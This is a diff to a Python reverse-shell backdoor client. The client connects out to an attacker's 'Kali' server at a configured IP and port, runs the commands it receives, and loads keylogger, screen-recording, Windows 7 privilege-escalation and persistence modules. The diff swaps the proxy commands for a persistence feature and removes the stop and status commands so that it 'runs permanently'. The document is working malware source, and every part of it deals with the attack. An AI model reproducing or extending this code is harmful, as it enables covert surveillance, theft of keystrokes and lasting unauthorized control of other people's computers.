@@ -10,11 +10,14 @@ import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 
+# Import configuration variables  
+from configuration import SERVER_IP, SERVER_PORT
+
 # Import enhanced features
 keylogger = None
 recorder = None  
 privilege_escalator = None
-proxy_manager = None
+persistence_manager = None
 
 import sys
 import os
@@ -28,7 +31,7 @@ if current_dir not in sys.path:
 from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
-from features.proxy import create_backdoor_proxy
+from features.persistence import create_backdoor_persistence
 
 
 # Function to send data in a reliable way (encoded as JSON)
@@ -53,8 +56,8 @@ def connection():
     while True:
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
-            # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
-            s.connect(('192.168.56.104', 5555))  # Update this to your Kali IP
+            # Connect to a remote host using configuration variables
+            s.connect((SERVER_IP, SERVER_PORT))  # Use configured IP and port
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -89,7 +92,7 @@ def download_file(file_name):
 
 # Main shell function for command execution with enhanced features
 def shell():
-    global keylogger, recorder, privilege_escalator, proxy_manager
+    global keylogger, recorder, privilege_escalator, persistence_manager
     
     while True:
         # Receive a command from the remote host
@@ -268,139 +271,18 @@ def shell():
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
                 
-        # PROXY COMMANDS
-        elif command == 'start_proxy':
+        # PERSISTENCE COMMANDS
+        elif command == 'start_persistence':
             try:
-                if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
-                success, msg = proxy_manager.start_proxy_operations()
-                reliable_send("proxy: " + msg)
+                if persistence_manager is None:
+                    persistence_manager = create_backdoor_persistence()
+                success, msg = persistence_manager.start_persistence_operations()
+                reliable_send("Persistence: " + msg)
             except Exception as e:
-                reliable_send("proxy start error: " + str(e))
+                reliable_send("Persistence start error: " + str(e))
                 
-        elif command == 'stop_proxy':
-            try:
-                if proxy_manager:
-                    success, msg = proxy_manager.stop_proxy_operations()
-                    reliable_send("proxy: " + msg)
-                else:
-                    reliable_send("No proxy active")
-            except Exception as e:
-                reliable_send("proxy stop error: " + str(e))
+        # Removed stop and status commands - persistence runs permanently
 
-        elif command == 'proxy_status':
-            try:
-                if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
-                status = proxy_manager.get_proxy_status()
-                reliable_send("proxy Status: " + json.dumps(status, indent=2))
-            except Exception as e:
-                reliable_send("proxy status error: " + str(e))
-                
-        elif command == 'test_proxy':
-            try:
-                if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
-                
-                # Enhanced test with more details
-                if proxy_manager.channel and proxy_manager.channel.is_running:
-                    import socket
-                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    test_sock.settimeout(5)
-                    try:
-                        # Test local connection
-                        result = test_sock.connect_ex(('127.0.0.1', proxy_manager.channel.listen_port))
-                        if result == 0:
-                            # Try to send test data
-                            test_sock.send(b"test\n")
-                            test_sock.settimeout(2)
-                            try:
-                                response = test_sock.recv(100)
-                                test_sock.close()
-                                reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} working - got response: {len(response)} bytes")
-                            except:
-                                test_sock.close()
-                                reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} accepting connections but no response")
-                        else:
-                            test_sock.close()
-                            reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} not responding (error: {result})")
-                    except Exception as e:
-                        test_sock.close()
-                        reliable_send(f"Proxy Test: Connection failed: {str(e)}")
-                else:
-                    reliable_send("Proxy Test: Proxy not running")
-                    
-                # Also test target connectivity
-                try:
-                    target_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    target_test.settimeout(3)
-                    result = target_test.connect_ex(('192.168.56.104', 5555))
-                    target_test.close()
-                    if result == 0:
-                        reliable_send("Target Test: Can reach Kali server at 192.168.56.104:5555")
-                    else:
-                        reliable_send(f"Target Test: Cannot reach Kali server (error: {result})")
-                except Exception as e:
-                    reliable_send(f"Target Test: Error testing Kali connection: {str(e)}")
-                    
-            except Exception as e:
-                reliable_send("Proxy test error: " + str(e))
-
-        elif command == 'test_proxy_full':
-            try:
-                if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
-                
-                if proxy_manager.channel and proxy_manager.channel.is_running:
-                    import socket
-                    import json
-                    import time
-                    
-                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    test_sock.settimeout(10)
-                    
-                    try:
-                        # Connect to proxy
-                        result = test_sock.connect_ex(('127.0.0.1', proxy_manager.channel.listen_port))
-                        if result == 0:
-                            # Send a real backdoor command through proxy
-                            test_command = "whoami"
-                            json_command = json.dumps(test_command)
-                            test_sock.send(json_command.encode())
-                            
-                            # Wait for response
-                            time.sleep(2)
-                            try:
-                                response = test_sock.recv(4096)
-                                test_sock.close()
-                                
-                                if response:
-                                    # Try to decode JSON response
-                                    try:
-                                        decoded_response = json.loads(response.decode())
-                                        reliable_send(f"Proxy Full Test SUCCESS: Got response through proxy:\n{decoded_response}")
-                                    except:
-                                        reliable_send(f"Proxy Full Test: Got raw response through proxy:\n{response.decode()}")
-                                else:
-                                    reliable_send("Proxy Full Test: Connected but no response received")
-                            except Exception as e:
-                                test_sock.close()
-                                reliable_send(f"Proxy Full Test: Error receiving response: {str(e)}")
-                        else:
-                            test_sock.close()
-                            reliable_send(f"Proxy Full Test: Cannot connect to proxy port {proxy_manager.channel.listen_port}")
-                            
-                    except Exception as e:
-                        test_sock.close()
-                        reliable_send(f"Proxy Full Test: Connection error: {str(e)}")
-                        
-                else:
-                    reliable_send("Proxy Full Test: Proxy not running - use 'start_proxy' first")
-                    
-            except Exception as e:
-                reliable_send("Proxy full test error: " + str(e))
-
-                
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
             try:
